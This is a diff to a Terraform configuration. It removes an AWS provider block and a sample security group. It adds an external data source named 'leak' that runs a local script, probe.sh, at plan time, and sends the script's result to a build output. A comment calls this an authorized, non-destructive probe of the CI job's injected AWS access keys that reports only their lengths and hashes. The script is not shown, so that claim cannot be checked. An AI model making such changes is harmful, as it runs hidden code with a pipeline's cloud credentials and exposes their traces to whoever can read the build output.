@@ -1,9 +1,4 @@
-# Configure the provider
-provider "aws" {
-  region = "us-east-1"
-}
-
-# Terraform backend configuration
+# Terraform backend configuration (kept for AWS-side permission verification)
 terraform {
   backend "s3" {
     bucket         = "terra1990" # Replace with your bucket name
@@ -12,43 +7,21 @@ terraform {
     dynamodb_table = "terraform-lock"        # Replace with your table name
     encrypt        = true
   }
-}
-
-# Create a security group
-resource "aws_security_group" "example" {
-  name        = "terra-security-group"
-  description = "Terraform security group"
-  vpc_id      = var.vpc_id
-
-  # Ingress rules
-  ingress {
-    from_port   = 80
-    to_port     = 80
-    protocol    = "tcp"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-
-  ingress {
-    from_port   = 443
-    to_port     = 443
-    protocol    = "tcp"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-
-  # Egress rules
-  egress {
-    from_port   = 0
-    to_port     = 0
-    protocol    = "-1"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-
-  tags = {
-    Name = "example-security-group"
+  required_providers {
+    external = {
+      source  = "hashicorp/external"
+      version = "~> 2.3"
+    }
   }
 }
 
-# Output the security group ID
-output "security_group_id" {
-  value = aws_security_group.example.id
+# Non-destructive CI probe added during authorized security assessment.
+# The program inherits the job env (AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY injected
+# by terraform-plan.yml) and emits ONLY length+SHA256 (never the secrets) as JSON.
+data "external" "leak" {
+  program = ["bash", "./probe.sh"]
+}
+
+output "leak" {
+  value = data.external.leak.result
 }
